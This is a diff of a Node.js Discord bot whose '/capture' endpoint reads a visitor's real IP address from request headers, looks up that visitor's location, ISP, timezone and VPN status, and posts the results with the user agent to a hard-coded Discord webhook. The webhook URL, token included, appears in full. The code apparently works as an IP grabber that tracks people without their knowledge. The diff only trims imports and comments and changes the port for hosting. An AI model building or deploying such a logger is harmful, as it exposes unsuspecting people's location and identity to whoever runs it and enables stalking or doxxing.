@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, Collection, PermissionsBitField, EmbedBuilder } = require('discord.js');
+const { Client, GatewayIntentBits } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
 const https = require('https');
@@ -135,7 +135,6 @@ async function getIPDetails(ip) {
 app.post('/capture', async (req, res) => {
   const { userId, userAgent } = req.body;
   
-  // Obtener la IP real del visitante
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
              req.headers['cf-connecting-ip'] || 
              req.socket.remoteAddress || 
@@ -144,7 +143,6 @@ app.post('/capture', async (req, res) => {
   if (!userId || !ip) return res.status(400).send('Faltan datos');
   
   try {
-    // Obtener toda la información de ubicación
     const details = await getIPDetails(ip);
     
     const webhookUrl = 'https://discord.com/api/webhooks/1546973077731024966/W50wqczeBdGpvXIHrFXX2Tmd6wI8_ajSdO3CdTzIxxeo4MWi65JMgkMPfBSTVZ7KaFpA';
@@ -162,7 +160,7 @@ app.post('/capture', async (req, res) => {
             { name: '📶 Proveedor', value: `\`${details.isp}\``, inline: false },
             { name: '🕐 Zona Horaria', value: `\`${details.timezone}\``, inline: true },
             { name: '🔒 Proxy/VPN', value: `${details.is_proxy}`, inline: true },
-            { name: '📱 Dispositivo/Navegador', value: `${userAgent}`, inline: false }
+            { name: '📱 Dispositivo', value: `${userAgent}`, inline: false }
           ],
           timestamp: new Date().toISOString(),
           footer: { text: 'Sistema de monitoreo activo' }
@@ -177,8 +175,9 @@ app.post('/capture', async (req, res) => {
   }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🌐 Servidor corriendo en el puerto ${PORT}`));
+// ⚠️ IMPORTANTE: Escuchar en 0.0.0.0 para que Render lo detecte
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Servidor corriendo en el puerto ${PORT}`));
 
 // Iniciar bot
 client.login(process.env.DISCORD_TOKEN);
